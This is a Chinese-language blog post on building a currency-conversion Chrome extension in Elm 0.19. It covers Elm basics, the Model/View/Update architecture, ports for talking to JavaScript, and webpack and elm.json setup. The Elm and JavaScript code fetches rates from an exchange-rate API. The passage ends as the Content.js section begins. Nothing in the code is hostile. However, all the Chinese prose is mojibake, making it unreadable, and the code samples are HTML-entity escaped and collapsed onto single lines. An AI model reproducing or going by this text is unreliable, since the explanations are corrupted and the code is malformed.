ç¨å¾®æ‰¾äº†ä¸€ä¸‹ Chrome web storeï¼Œä¸¦æ²’æœ‰çœ‹åˆ°é©åˆçš„ extensionï¼Œæ‰€ä»¥æ±ºå®šè‡ªå·±æ‰“é€ ä¸€å€‹ã€‚
è€Œå‰›å¥½åœ¨å‰å¹¾é€±åƒåŠ äº†åŒäº‹ä¸»è¾¦çš„ Meetupï¼Œå…¶ä¸­æœ‰å€‹ Topic æ˜¯ä»‹ç´¹ Elm é€™å€‹èªè¨€ï¼Œä»¥å‰é›–ç„¶ä¹Ÿè½éä»‹ç´¹ï¼Œä½†é€™æ¬¡è½åˆ°å¯¦éš›ç”¨åœ¨ Production çš„æ¡ˆä¾‹å¾Œï¼Œæé«˜æˆ‘ä¸å°‘èˆˆè¶£ï¼ŒåŠ ä¸Šé©é€¢å…¬å¸çš„ hackdayï¼Œç´¢æ€§å°±åˆ©ç”¨é€™æ©Ÿæœƒä¾†ç·´ç¿’ä¸€ä¸‹ï¼Œç”¨ Elm ä¾†è£½ä½œæˆ‘æƒ³è¦çš„ Chrome Extensionï¼
ä»Šå¤©å°±ç”¨é€™ç¯‡æ–‡ç« è¨˜éŒ„ä¸€ä¸‹ä½¿ç”¨ Elm è£½ä½œ Chrome Extension çš„æ–¹æ³•èˆ‡å¿ƒå¾—ï¼Œä¸éç•¢ç«Ÿæ˜¯ hackday ä½œå“ï¼ŒåŠŸèƒ½å°šéœ€å®Œå–„å°±æ˜¯ã€‚
ä»€éº¼æ˜¯ Elmï¼Ÿ
ä¸çŸ¥é“æœ‰æ²’æœ‰äººè·Ÿæˆ‘ä¸€æ¨£ï¼Œä¹‹æ‰€ä»¥çŸ¥é“ Elmï¼Œæ˜¯å› ç‚º Redux çš„ä½œè€…èªªä»–å—å…¶å•Ÿç™¼ï¼Ÿ
è·Ÿ Redux ä½œè€…ä¸€æ¨£ï¼ŒElm çš„ä½œè€… - Evan Czaplicki ä¹Ÿæ˜¯å€‹å¹´è¼•å¥‡æ‰ï¼ŒElm æ˜¯ä»–åœ¨å“ˆä½›çš„è«–æ–‡ï¼Œæ¨è–¦å¤§å®¶çœ‹ä¸€ä¸‹ä»– 2012 å¹´çš„æ¼”è¬›å½±ç‰‡ï¼Œå¯ä»¥äº†è§£ä»–ç‚ºä½•å‰µé€ é€™é–€èªè¨€ï¼Œè½è½ä½œè€…æœ¬äººè¦ªå£ä»‹ç´¹ã€‚
Elm æ˜¯ä¸€å€‹å¼·å‹æ…‹çš„å‡½æ•¸å¼èªè¨€ï¼Œé€éç·¨è­¯ï¼Œå°‡æœ€çµ‚ç¨‹å¼ç¢¼è½‰åŒ–ç‚º JavaScriptï¼Œå› æ­¤åŸ·è¡Œåœ¨ä»»ä½• Web å¹³å°ã€‚ä¸»è¦æœ‰ä»¥ä¸‹ç‰¹é»ï¼š

No Runtime Exceptions

åœ¨ç·¨è­¯æœŸé–“ï¼ŒElm æœƒåˆ©ç”¨ Type inference åµæ¸¬å„ç¨®ç‹€æ…‹ï¼Œæœ‰ä»»ä½•å‹åˆ¥ä¸Šçš„éŒ¯èª¤éƒ½æœƒè¢«æŠ“å‡ºä¾†ï¼Œæ›´æ£’çš„æ˜¯ï¼ŒElm æä¾›çš„ hint å¾ˆäººæ€§åŒ–ï¼Œä¾‹å¦‚ï¼š


Great Performance

å¦‚åŒ React ä¸€èˆ¬ï¼ŒElm ä¹Ÿæœ‰è‡ªå·±çš„ Virtual DOM å¯¦ä½œï¼Œæ ¹æ“šå®˜ç¶²æ‰€èªªï¼Œç”±æ–¼ Elm çš„æ‰€æœ‰å€¼éƒ½æ˜¯ immutableï¼Œæœ‰åŠ©æ–¼ä»–å€‘èƒ½ç·¨è­¯å‡ºæœ€ä½³åŒ–çš„ JavaScriptï¼Œè®“ runtime è®Šå¿«ã€‚ source: elm-lang.org


Enforced Semantic Versioning

Elm å¼·å¤§çš„ type system è®“ä»–èƒ½è‡ªå‹•åµæ¸¬æ˜¯å¦æœ‰ API çš„æ›´å‹•ï¼Œä¸¦æ ¹æ“šä½  release æ™‚èˆ‡ä¸Šä¸€ç‰ˆæœ¬çš„å·®ç•°ï¼Œé€²è¡Œ Semantic Versioningï¼Œè®“ä½ ä¸æœƒä¸å°å¿ƒå› ç‚ºéŒ¯èª¤çš„ PATCH release é€ æˆåˆ¥äººçš„å›°æ“¾ï¼


Small Assets

Elm å®£ç¨±å…¶ Optimize çš„ç·¨è­¯ï¼Œèƒ½ç”¢ç”Ÿæ¯” React 16.4 æ›´å°çš„ Assetsã€‚source: elm-lang.org


JavaScript Interop

å¦‚åŒ React ä¸€æ¨£ï¼Œä½ ä¹Ÿå¯ä»¥åªåœ¨ä¸€å€‹å°å°çš„ div ä¸Šæ›è¼‰ Elm applicationï¼Œè—‰æ­¤ä¾†æ¸¬è©¦ project ä¸­çš„æŸä¸€å€‹å°éƒ¨åˆ†ï¼Œæ¡ç”¨ä¸Šå¯ä»¥å¾ªåºæ¼¸é€²ï¼Œä¸æœƒæœ‰å¤ªå¤§é¢¨éšªï¼Œä¸¦ä¸”ç”±æ–¼ç·¨è­¯æˆ JavaScriptï¼ŒElm èƒ½æ–¹ä¾¿çš„èˆ‡ä¸€èˆ¬çš„ JavaScript æºé€šã€‚ï¼ˆåŸºæœ¬ä¸Šæˆ‘ä¹Ÿæ˜¯çœ‹åˆ°é€™é»æ‰æœ‰ä¿¡å¿ƒ Elm èƒ½æ‹¿ä¾†è£½ä½œ Chrome extension çš„ï¼‰



å…ˆå·çœ‹ä¸€ä¸‹ Elm çš„ç¨‹å¼ç¢¼åˆ°åº•é•·æ€æ¨£view : Model -&gt; Html Msgview model =    Html.div        [ Html.Attributes.class &quot;Content&quot;        ]        [          Html.text (&quot;Hello Elm!&quot;)        ]

é€™æ˜¯ä¸€å€‹ç°¡å–®çš„ Elm viewï¼Œç¬¬ä¸€è¡Œæ˜¯æè¿°é€™å€‹ View æ‰€æ¥æ”¶çš„åƒæ•¸å‹åˆ¥ï¼Œä»¥åŠå›å‚³çš„åƒæ•¸å‹åˆ¥ï¼Œç¬¬äºŒè¡Œå¾Œæ‰æ˜¯å¯¦éš›çš„ç¨‹å¼ç¢¼ã€‚
çœ‹èµ·ä¾†éå¸¸ç•¸å½¢ã€‚
ä¸€é–‹å§‹å¾ˆé›£ç†è§£ï¼Œæ²’é—œä¿‚ï¼Œæˆ‘å¯«å®Œé€™å€‹ extension ä»¥å¾Œä¹Ÿé‚„æ˜¯è¦ºå¾—å¾ˆé›£ç†è§£ã€‚
ç•¢ç«Ÿæœƒéœ€è¦èŠ±ä¸å°‘æ™‚é–“ç¿’æ…£é€£ HTML éƒ½æ˜¯å‡½æ•¸çš„æ¦‚å¿µï¼Œè£¡é¢çš„ HTML.div å°±æ˜¯ä¸€å€‹å‡½æ•¸ï¼Œä»–æ¥å—å…©å€‹é™£åˆ—ï¼Œä¸€å€‹ç”¨ä¾†å®šç¾© div çš„ attributeï¼Œä¸€å€‹ç”¨ä¾†æè¿°å…¶ childã€‚åœ¨å¾Œé¢çš„å¯¦ä½œç¯„ä¾‹å…§ï¼Œæˆ‘å€‘æœƒçœ‹åˆ°æ›´å¤šé¡ä¼¼çš„èªæ³•ã€‚
Elm åŸºæœ¬å®‰è£ä½¿ç”¨Elm çš„å®‰è£å¾ˆç°¡å–®ï¼Œå®˜ç¶²æä¾›å„å¹³å°çš„ installerï¼Œå®‰è£å®Œå¾Œå°±èƒ½åœ¨ä½ çš„ Terminal ä¸­ä½¿ç”¨ä»¥ä¸‹å¹¾å€‹æŒ‡ä»¤ï¼š
elm repl - é¡§åæ€ç¾©ï¼Œ Elm çš„ replï¼š

elm reactor - é¡ä¼¼ react çš„ create-react-appï¼Œæœƒå¿«é€Ÿå¹«ä½ å»ºç«‹ä¸€å€‹åŸºç¤çš„ Elm Architectureã€‚
elm make - elm çš„ compile æŒ‡ä»¤ï¼Œå°‡ä½ çš„ Elm code ç·¨è­¯æˆ HTML æˆ–æ˜¯ JavaScriptï¼š
elm make Main.elm --output=main.js

elm install - é¡ä¼¼ npm installï¼Œå¹«ä½ ä¸‹è¼‰æ‰€éœ€çš„å¥—ä»¶ã€‚æ‰€æœ‰çš„ Elm packages éƒ½åœ¨ package.elm-lang.org ä¸­ã€‚è€Œä½ å°ˆæ¡ˆä¸­ packages çš„ dependencies æœƒåœ¨è‡ªå‹•ç´€éŒ„åœ¨ elm.json ä¸­ã€‚
Elm Architectureç¾åœ¨çš„å‰ç«¯é–‹ç™¼è€…å°æ–¼ Elm çš„æ¶æ§‹æ‡‰è©²éƒ½æœƒè¦ºå¾—ä¸é™Œç”Ÿï¼Œå› ç‚ºå°±å¾ˆæ¸…æ¥šçš„åˆ†ç‚º Modelã€Viewã€Updateï¼š

Model - ä½ çš„ application çš„ state
Update - æ›´æ–° state é‚è¼¯çš„éƒ¨åˆ†
View - ç¶å®š State æ›´æ–° HTML

ä¸€å€‹åŸºæœ¬çš„ Elm ç¨‹å¼å¤§æ¦‚å°±æ˜¯åŒ…å«é€™ä¸‰å¤§å€å¡Šï¼š
import Html exposing (..)-- MODELtype alias Model = &#123; ... &#125;-- UPDATEtype Msg = Reset | ...update : Msg -&gt; Model -&gt; Modelupdate msg model =  case msg of    Reset -&gt; ...    ...-- VIEWview : Model -&gt; Html Msgview model =  ...

åœ¨æ¥ä¸‹ä¾†çš„ç¯„ä¾‹å…§ï¼Œä¹Ÿæ˜¯éµå¾ªé€™æ¨£çš„æ–¹å¼æ’°å¯«ã€‚
å­¸ç¿’è³‡æºæ—¢ç„¶èªæ³•é€™éº¼å›°é›£ï¼Œè¦å­¸ç¿’çš„è©±ï¼Œå‹¢å¿…è¦æœ‰å®Œå–„çš„ Docs æˆ–æ˜¯ç¯„ä¾‹åƒè€ƒï¼Œä½†å¯æƒœçš„æ˜¯ï¼Œé›–ç„¶ Elm å¾ 2012 å‡ºä¾†åˆ°ç¾åœ¨ä¹Ÿå°‡è¿‘ä¸ƒå¹´äº†ï¼Œä½¿ç”¨äººæ•¸é‚„æ˜¯å°çœ¾ï¼Œè¦æ‰¾å°‹ç¯„ä¾‹æˆ–æ˜¯æ•™å­¸éƒ½è »å›°é›£çš„ï¼Œæ¨è–¦çš„æ–¹å¼æ˜¯å…ˆå»å®˜ç¶²é–±è®€ guide lineï¼Œç†è§£åŸºæœ¬æ¦‚å¿µèˆ‡æœ€æ–°ç‰ˆæœ¬çš„ APIï¼Œä¸¦å¤§è‡´ç€è¦½ä¸€ä¸‹èªæ³•ï¼Œæ¥è‘—åˆ° Beginning Elm é‡æ¸…ä¸€ä¸‹ä¸æ‡‚çš„éƒ¨åˆ†ï¼Œå› ç‚ºé€™ç¶²ç«™å°‡è »å¤šè§€å¿µä»¥åœ–åƒåŒ–çš„æ–¹å¼èªªæ˜ï¼Œæˆ‘è¦ºå¾—æœƒæ¯”å®˜æ–¹ç¶²ç«™çš„ guide å¥½æ‡‚ã€‚
ä¸éè¦æ³¨æ„çš„ä¸€é»æ˜¯ï¼ŒBeginning Elm çš„å…§å®¹åŸºæœ¬ä¸Šæ˜¯ Elm 0.18 çš„ç‰ˆæœ¬ï¼Œä¸¦éç¾åœ¨æœ€æ–°çš„ 0.19ï¼Œæ‰€ä»¥åœ¨èªæ³•èˆ‡ä¸€äº› core lib çš„ç”¨æ³•ä¸Šæœƒä¸ä¸€æ¨£ï¼Œä½†è§€å¿µçš„ç†è§£é‚„æ˜¯å…±é€šçš„ï¼Œæ‰€ä»¥èƒ½äº¤äº’åƒç…§ã€‚
é€™ä¹Ÿæ˜¯æˆ‘åœ¨å¯¦ä½œ Elm é‡åˆ°çš„ä¸€å€‹é˜»ç¤™ï¼Œç¶²è·¯ä¸Šå¤§å¤šçš„æ•™å­¸é›†ä¸­åœ¨ 2017ï¼Œç•¶æ™‚é‚„æ˜¯ 0.18 ç‰ˆæœ¬ï¼Œå› æ­¤è¨±å¤šç¯„ä¾‹ç¾åœ¨éƒ½æ²’è¾¦æ³•æ­£å¸¸é‹ä½œï¼Œé™¤éä½ é™ç‰ˆã€‚
é–‹å§‹å¯¦ä½œï¼ç„¡è«–å¦‚ä½•ï¼Œé ­æ´—ä¸‹å»äº†é‚„æ˜¯å¾—ç¹¼çºŒå¯¦ä½œã€‚
æœ‰å¯¦ä½œé Chrome extension çš„äººæ‡‰è©²éƒ½çŸ¥é“ï¼ŒåŸºæœ¬çš„ä¸‰å¤§å…ƒç´ å°±æ˜¯ï¼šbackground.jsã€content.js èˆ‡ popup.htmlï¼Œå…¶å½¼æ­¤ä¹‹é–“ç’°å¢ƒäº’ç›¸ç¨ç«‹ï¼Œé€é postMessage ä¾†æºé€šã€‚
è€Œæ—¢ç„¶ Elm èƒ½ç·¨è­¯æˆ JavaScriptï¼Œæˆ‘å°±æƒ³æˆ‘æ‡‰è©²å¯ä»¥åˆ†åˆ¥æ’°å¯« Elm application ç„¶å¾Œ compile æˆ background.jsï¼Œcontent.jsï¼Œé€™åšæ³•å¯èƒ½æœƒæœ‰é»å¥‡æ€ªï¼Œæ—¢ç„¶è¦ç”¨ Elmï¼Œä½ åˆå¯« JavaScriptï¼Ÿ
ä½†æˆ‘è¦ºå¾—é€™æ¨£åè€Œæ¯”è¼ƒèƒ½åœ¨æ¼¸é€²å¼çš„å­¸ç¿’ Elmï¼Œä¸€äº›è¼ƒå›°é›£ç†è§£çš„éƒ¨åˆ†å°±é‚„æ˜¯äº¤ç”± JavaScript è™•ç†ã€‚
æœ‰äº†æƒ³æ³•å¾Œé–‹å§‹æœå°‹ç¯„ä¾‹ï¼Œé›–ç„¶æ–°ç‰ˆçš„ç¯„ä¾‹ä¸å¤šï¼Œä½†å¥½åœ¨é‚„æ˜¯èƒ½å¾èˆŠç‰ˆä¸­æ‰¾åˆ°ç¬¦åˆæˆ‘å¿ƒä¸­æ‰€æƒ³çš„ç¯„ä¾‹ï¼Œåªæ˜¯å¾—èŠ±é»æ™‚é–“ upgrade æˆæ–°ç‰ˆã€‚
elm-chrome-extension æ˜¯æˆ‘æ‰¾åˆ°æœ€ç¬¦åˆæˆ‘é æœŸçš„ç¯„ä¾‹ã€‚
è€Œé€™æ˜¯æˆ‘ç¿»æ–°æˆ 0.19 å¾Œçš„ç‰ˆæœ¬ elm-chrome-extension 0.19 ç‰ˆã€‚
åŸºæœ¬æ¶æ§‹
æˆ‘å€‘é€™é‚Šå°‡ background.js èˆ‡ content.js ç•¶ä½œä¸åŒçš„ Elm application ä¾†æ’°å¯«ï¼Œå½¼æ­¤ä¹‹é–“å†é€é Elm ç‰¹æ®Šçš„ JavaScript Interop ä¾†æºé€šï¼ˆå¾Œé¢æœƒè¬›åˆ°ï¼‰ã€‚
ç”±æ–¼å€‹åˆ¥ç•¶ä½œä¸€å€‹ applicationï¼Œå°±ç”¨å„è‡ªçš„ webpack ä¾†å¹«å¿™ compile è·Ÿæ‰“åŒ…ã€‚
Model.elm å‰‡æ˜¯å–®ç´”ç”¨ä¾†å®šç¾©æˆ‘å€‘æ•´å€‹ Extension çš„ Stateã€‚
æœ€å¾Œä¸‰å€‹ Elm application ç·¨å„„å®Œçš„çµæœéƒ½æœƒæ”¾å…¥ dist ä¸­ï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘æœ€å¾Œçš„æˆå“ã€‚
å¦å¤–å‰é¢æ²’æœ‰æåˆ°çš„ä¸€å€‹è³‡æ–™å¤¾ elm-stuffï¼Œå…¶åŠŸç”¨å°±åƒ node_modules ä¸€æ¨£ï¼Œç•¶ä½  elm install å®Œå¾Œï¼ŒElm æœƒå°‡ packages æ”¾å…¥å…¶ä¸­ã€‚
è€Œ elm.json å‰‡æ˜¯é¡ä¼¼ package.json åŠ ä¸Š package-lock.json çš„å­˜åœ¨ï¼š
&#123;    &quot;type&quot;: &quot;application&quot;,    &quot;source-directories&quot;: [        &quot;./background&quot;,        &quot;./content&quot;,        &quot;./common&quot;    ],    &quot;elm-version&quot;: &quot;0.19.0&quot;,    &quot;dependencies&quot;: &#123;        &quot;direct&quot;: &#123;            &quot;elm/browser&quot;: &quot;1.0.1&quot;,            &quot;elm/core&quot;: &quot;1.0.0&quot;,            &quot;elm/html&quot;: &quot;1.0.0&quot;,            &quot;elm/json&quot;: &quot;1.1.3&quot;,            &quot;myrho/elm-round&quot;: &quot;1.0.4&quot;        &#125;,        &quot;indirect&quot;: &#123;            &quot;elm/time&quot;: &quot;1.0.0&quot;,            &quot;elm/url&quot;: &quot;1.0.0&quot;,            &quot;elm/virtual-dom&quot;: &quot;1.0.2&quot;        &#125;    &#125;,    &quot;test-dependencies&quot;: &#123;        &quot;direct&quot;: &#123;&#125;,        &quot;indirect&quot;: &#123;&#125;    &#125;&#125;

å¯ä»¥çœ‹åˆ° Elm æ˜¯ç”¨ exact versionsï¼Œå¯ä»¥ä¿è­‰ reliable buildsã€‚è€Œ dependencies ä¸­çš„ direct å°±æ˜¯æ‰€æœ‰ä½ èƒ½ç›´æ¥åœ¨ Elm code ä¸­ import çš„ packageï¼Œè€Œé‚£äº› package æ‰€å„è‡ªå¼•ç”¨çš„å…¶ä»– lib å‰‡æœƒè‡ªå‹•è¢«è¼‰å…¥åˆ° indirect ä¸­ã€‚
å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé›–ç„¶æˆ‘å€‘æ•´å€‹ project ç”¨äº†ä¸‰å€‹ Elm applicationï¼Œä½†æˆ‘å€‘æ˜¯å…±ç”¨åŒä¸€å€‹ elm.json ä¾†ç®¡ç† packagesï¼Œå› æ­¤åœ¨ source-directories çš„åœ°æ–¹æˆ‘å€‘ç¾…åˆ—ä¸‰å€‹ source ä¾†æºã€‚
å°ˆæ¡ˆå¯¦ä½œæ–¹å¼æ¦‚ç•¥é€™å€‹ Extension çš„åŠŸèƒ½å¾ˆå–®ç´”ï¼Œæµç¨‹å¦‚ä¸‹ï¼š
ä½¿ç”¨è€… Select äº†æŸæ®µæ•¸å­—å¾Œï¼Œå°±æœƒç”± Content.js å°‡é¸å–çš„æ•¸å­—å‚³éçµ¦ Background.js å»è™•ç†ï¼Œè€Œ Background.js å°±æœƒè² è²¬æ‹‰å–åŒ¯ç‡ APIï¼Œä¸¦å°‡ä½¿ç”¨è€…é¸å–çš„æ•¸å­—é€²è¡Œæ›ç®—ï¼Œæ¥è‘—å°‡çµæœæ›´æ–°åˆ° Model ä¸Šï¼Œå†ç¶“ç”± Model çš„è®Šå‹•å»è§¸ç™¼ Content.js é€²è¡Œ View çš„æ›´æ–°ã€‚
æˆ‘å€‘ä¸€æ­¥ä¸€æ­¥ä¾†çœ‹ï¼Œä¸»è¦æœƒ Focus åœ¨å¦‚ä½•æ›´æ–° Modelï¼Œä»¥åŠå¦‚ä½•è®“ Elm(è¨ˆç®—é‚è¼¯) èˆ‡ JavaScript(é é¢ Dom èˆ‡ Chrome API) äº’ç›¸æºé€šã€‚
Modelé¦–å…ˆï¼Œæˆ‘å€‘å…ˆå¾æœ€ç°¡å–®çš„ Model çœ‹èµ·ï¼š
module Model exposing (Model)-- This is the model in common among all of our appstype alias Model =    &#123; result: Float, selectedContent: Int, exrateTWD: Float, exrateJPY: Float &#125;

line 1 å°±æ˜¯ Elm ä¸­è¼‰å…¥ package çš„æ–¹å¼ï¼Œè€Œåœ¨æˆ‘å€‘çš„ application ä¸­ï¼ŒModel å…§å®¹å¾ˆå–®ç´”ï¼Œä¸»è¦æ˜¯è¨˜éŒ„å‹åˆ¥ç‚º Float çš„çµæœï¼ˆresult)ã€Int çš„ selectContentã€Float çš„ exrateTWD èˆ‡ exrateJPYã€‚
ç„¶å¾Œé€é webpack loader ä¾†å¹«å¿™ç·¨è­¯ï¼š
module.exports = &#123;  module: &#123;    rules: [      &#123;...&#125;,      &#123;        test: /\.elm$/,        exclude: [/elm-stuff/, /node_modules/],        use: [&#x27;elm-hot-webpack-loader&#x27;, &#x27;elm-webpack-loader?verbose=true&#x27;],      &#125;,    ],  &#125;,&#125;

Main.elm in Background.jsåœ¨ Background è³‡æ–™å¤¾ä¸­ï¼Œæˆ‘å€‘æœ‰ä¸€å€‹ index.js èˆ‡ Main.elmï¼Œindex.js è² è²¬èˆ‡ content.js æºé€šå’Œè™•ç† chrome api ç›¸é—œçš„ JavaScriptï¼›Main.elm å‰‡æ˜¯è² è²¬è¨ˆç®—åŒ¯ç‡ä»¥åŠæ›´æ–° Modelã€‚
index.js æœƒèˆ‡ Main.elm äº’ç›¸æºé€šï¼ŒWebpack æœƒå°‡å…©è€…æ‰“åŒ…æˆ background.jsã€‚
ä½† JavaScript æ€éº¼èˆ‡ Elm æºé€šå‘¢ï¼Ÿå®¹è¨±æˆ‘å¾ Beginning Elm ä¸­å€Ÿå¼µåœ–ï¼š

å¾é€™å¼µåœ–å¯ä»¥å¾ˆæ¸…æ¥šçœ‹åˆ° Elm runtime æ˜¯æ€éº¼è·Ÿå¤–éƒ¨æºé€šï¼Œåˆæ˜¯æ€éº¼èˆ‡æˆ‘å€‘ç¨‹å¼é‚è¼¯äº’å‹•ã€‚
é€é Command æˆ‘å€‘å¯ä»¥å° Elm runtime ä¸‹é”æŒ‡ä»¤å»åŸ·è¡Œ side effectï¼Œåƒæ˜¯ HTTP request ç­‰ç­‰ï¼›Elm runtime å‰‡è—‰ç”± Subscription èˆ‡ Message å°‡ side effect çµæœå‚³éå› application æœ¬èº«ã€‚
é€é Messageï¼ŒElm runtime èˆ‡æˆ‘å€‘çš„ application å¯ä»¥çŸ¥é“è¦åŸ·è¡Œç”šéº¼å‹•ä½œï¼ŒåŒ…å« Update Stateï¼ˆModelï¼‰æˆ–æ˜¯æ›´æ–° Viewã€‚
è€Œè‹¥æ˜¯éœ€è¦èˆ‡å¤–éƒ¨ JavaScript æºé€šï¼Œå‰‡æœ‰ Ports æä¾›æ©‹æ¨‘ï¼Œåœ¨ JavaScript ä¸­ï¼Œèƒ½ä½¿ç”¨é¡ä¼¼ postMessage çš„æ–¹å¼å‚³éè³‡æ–™ã€‚
ä¾†çœ‹çœ‹ background ä¸­çš„ Main.elmï¼š
-- ... çœç•¥ import packages-- PORTS FROM JAVASCRIPTport selected : (Model -&gt; msg) -&gt; Sub msg-- PORTS TO JAVASCRIPTport broadcast : Model -&gt; Cmd msg-- MODELinit : Flags -&gt; ( Model, Cmd Msg )init flags =    ( &#123;        selectedContent = flags.selectedContent,        exrateTWD = flags.exrateTWD,        exrateJPY = flags.exrateJPY,        result = flags.result     &#125;    , Cmd.none    )type Msg    = NoOp    | Select Modelupdate : Msg -&gt; Model -&gt; ( Model, Cmd Msg )update msg model =    case msg of        NoOp -&gt;            ( model, Cmd.none )        Select data -&gt;            let                nextModel =                    &#123; model | result = (toFloat data.selectedContent) * (data.exrateTWD / data.exrateJPY) &#125;            in            ( nextModel, broadcast nextModel )subscriptions : Model -&gt; Sub Msgsubscriptions model =    selected (\newModels -&gt; Select newModels)type alias Flags =    &#123;      selectedContent: Int,      exrateTWD: Float,      exrateJPY: Float,      result: Float    &#125;main : Program Flags Model Msgmain =    Platform.worker        &#123; init = init        , update = update        , subscriptions = subscriptions        &#125;

background çš„ Main.elm ä¸­ï¼Œä¸»è¦æœ‰å¹¾å€‹å€å¡Šï¼š

port keywordï¼šå®šç¾©ç”¨ä¾†çµ¦å¤–éƒ¨ JavaScript å‘¼å«çš„å‡½æ•¸ï¼Œä»¥åŠ Elm è¦å‚³éè³‡æ–™çµ¦ JavaScript æ™‚å‘¼å«çš„å‡½æ•¸

init å‡½æ•¸ï¼šæˆ‘å€‘å®šç¾© init å‡½æ•¸ï¼Œåˆå§‹åŒ– application çš„ Model (Stateï¼‰ï¼ŒFlags æ˜¯ Elm ä¸­ç‰¹æ®Šçš„å‹åˆ¥ï¼Œå¤–éƒ¨ JavaScript å¯ä»¥é€é Flags åœ¨ Elm çš„ init éšæ®µå‚³éåˆå§‹ State è³‡æ–™ã€‚å¦‚åŒä¸Šé¢ç¯„ä¾‹ä¸­ï¼Œinit å‡½æ•¸æ¥æ”¶ä¸€å€‹ Flags åƒæ•¸ï¼Œä¸¦å°‡å…¶ assign åˆ°æ–°çš„ç‰©ä»¶ç•¶ä¸­ï¼Œä¸¦ä¸”å›å‚³ï¼Œè€Œé€™ç‰©ä»¶å°±æ˜¯ï¼ˆä¹Ÿå¿…é ˆæ˜¯ï¼‰Modelã€‚

subscriptionsï¼šç•¶å¤–éƒ¨ JavaScript å‘¼å«æˆ‘å€‘åœ¨ port ä¸­å®šç¾©çš„å‡½æ•¸æ™‚ï¼ŒElm æœƒé€é subscriptions ä¾†è™•ç†å›æ‡‰ï¼ŒåŸºæœ¬ä¸Šéƒ½æœƒæ˜¯å‘¼å«ä¸€å€‹å‡½æ•¸ï¼Œè€Œè©²å‡½æ•¸æœƒ Trigger updateï¼Œä¸Ÿå…¥ ä¸€å€‹ Message å»æ›´æ–° Modelï¼Œä»¥ä¸Šé¢ä¾‹å­ä¾†èªªï¼ŒJavaScript æœƒå‚³é€²æ–°çš„ Modelï¼Œè€Œ Elm subscriptions å°‡æ–°çš„ Model ä»¥åŠæˆ‘å€‘æŒ‡å®šçš„ Message å‚³éçµ¦ update å»çœŸæ­£çš„å°‡ Model æ›´æ–°ã€‚

updateï¼šupdate ç›¸å°å–®ç´”ä¸€é»ï¼Œæ¥æ”¶ Message èˆ‡ Model å‹åˆ¥çš„ç‰©ä»¶ï¼Œæ ¹æ“š Message çš„å…§å®¹å»åˆ¤æ–·è¦é€²è¡Œä»€éº¼æ›´æ–°ã€‚åœ¨ä¸Šé¢ä¾‹å­ä¸­ï¼Œæˆ‘å€‘æ¥æ”¶åˆ° Select é€™å€‹ messageï¼Œä»£è¡¨æ”¶åˆ° JavaScript å‚³ä¾†çš„æ–° Modelï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨è€…é¸å–çš„æ•¸å­—ï¼‰ï¼Œè€Œ Model ä¸­æœ‰è¦è½‰æ›çš„é‡‘é¡ï¼Œä»¥åŠå°æ—¥å¹£çš„åŒ¯ç‡å·®ï¼Œæˆ‘å€‘åœ¨é€™é‚Šé€²è¡Œä¸»è¦çš„é‚è¼¯é‹ç®—ï¼Œå°‡çµæœç”¢ç”Ÿæˆæ–°çš„ Modelï¼Œé€éå‘¼å« broadcast é€™å€‹ å®šç¾©åœ¨ port ä¸­çš„ Commandï¼Œå°‡å…¶å›å‚³å› JavaScriptã€‚

mainï¼šæ˜¯ Main.elm é€™å€‹ç¨‹å¼çš„ä¸»è¦é€²å…¥é»ï¼Œé€™éš» Elm ç¨‹å¼ä¸¦æ²’æœ‰åƒèˆ‡åˆ° View çš„éƒ¨åˆ†ï¼Œå› æ­¤æˆ‘å€‘ä½¿ç”¨ Platform.worker å‡½æ•¸å¯¦ä½œï¼Œå°‡å®šç¾©å¥½çš„ init, update èˆ‡ subscriptions å‚³å…¥ã€‚


ç¯‡å¹…æœ‰é™å¯¦åœ¨ç„¡æ³•å°‡æ¯å€‹ API éƒ½è©³ç´°ä»‹ç´¹ï¼Œå»ºè­°åƒç…§å®˜ç¶² Guide äº†è§£å…¶è©³ç´°å…§å®¹ã€‚
index.js in Background.jsJavaScript çš„éƒ¨åˆ†å°±ç°¡å–®ä¸€äº›ï¼Œé‡é»åœ¨æ–¼åˆå§‹åŒ– Stateï¼š
import &#123; Elm &#125; from &#x27;./Main.elm&#x27;;let currState = &#123;  selectedContent: 0,  exrateTWD: 0.0,  exrateJPY: 0.0,  result: 0.0&#125;const app = Elm.Main.init(&#123;  flags: currState&#125;);

åœ¨ index.js æˆ‘å€‘è¼‰å…¥ Main.elmï¼Œä¸¦å‘¼å«å…¶ Main.init å‡½æ•¸ï¼Œå‚³å…¥ flags ç‰©ä»¶ä¾†åˆå§‹åŒ– stateã€‚
æ¥è‘—ï¼Œsubscribe Elm çš„ ports broadcastï¼Œç•¶ Elm å‚³éè¨Šæ¯éä¾†æ™‚ï¼Œæˆ‘å€‘é€é chrome çš„ postMessage å‚³éçµ¦ content.jsã€‚ï¼ˆé€™é‚Šçš„ port æ˜¯ chrome.runtime.onConnect çš„ portï¼Œç´°ç¯€è«‹çœ‹ source code ï¼‰
function broadcast(state) &#123;  currState = state  for (const port of listeners) &#123;    port.postMessage(state)  &#125;&#125;app.ports.broadcast.subscribe(state =&gt; &#123;  broadcast(state)&#125;)

æœ€å¾Œé€™é‚Šæˆ‘æœ‰é»å·åƒæ­¥ï¼Œç”±æ–¼é€é Elm ç™¼é€ HTTP request å¾Œçš„çµæœèˆ‡æˆ‘ç›®å‰çš„ model ä¹‹é–“è¦å¦‚ä½•æ•´åˆï¼Œæˆ‘åœ¨ä¸€å¤©çš„ hackday ä¸­å¯¦åœ¨æ²’æœ‰ç ”ç©¶å‡ºä¾†ï¼Œæ‰€ä»¥çœå»é‚£æ®µï¼Œè®“ fetch åŒ¯ç‡è³‡æ–™çš„éƒ¨åˆ†ç”± JS å®Œæˆï¼Œæœ€å¾Œå†é€é port çš„ selected å°‡ API result send çµ¦ Elmï¼š
chrome.runtime.onMessage.addListener((request, sender) =&gt; &#123;  if (request.kind === &#x27;selected&#x27;) &#123;    const selectNum = request.selectedContent.replace(&#x27;,&#x27;, &#x27;&#x27;);    fetch(&#x27;https://tw.rter.info/capi.php&#x27;)      .then(function(response) &#123;        return response.json()      &#125;)      .then(function(myJson) &#123;        const &#123;          USDJPY: &#123; Exrate: ExrateJPY &#125;,          USDTWD: &#123; Exrate: ExrateTWD &#125;        &#125; = myJson        app.ports.selected.send(&#123; result: 0.0, exrateTWD: ExrateTWD, exrateJPY: ExrateJPY, selectedContent: +selectNum&#125;)      &#125;);  &#125;&#125;)

Main.elm in Content.jsè™•ç†å¥½ Background.jsï¼Œæ¥è‘—å°±æ˜¯ Content.jsã€‚
